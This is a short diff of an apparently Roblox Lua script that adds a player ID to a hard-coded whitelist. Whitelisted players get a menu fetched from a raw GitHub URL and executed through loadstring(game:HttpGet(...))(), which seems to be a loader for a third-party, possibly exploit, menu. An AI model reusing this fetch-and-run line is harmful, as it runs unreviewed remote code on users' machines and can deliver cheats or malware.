@@ -8,6 +8,7 @@ or player.UserId == 1631756307 --johnboy
 or player.UserId == 322201727 --izuko
 or player.UserId == 146606326 -- madara
 or player.UserId == 2024360886 -- self
+or player.UserId == 1762484492 -- daiwaye
 or player.UserId == 1030263172 then -- iilris 
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/imiranian/menu/main/load", true))()
 else
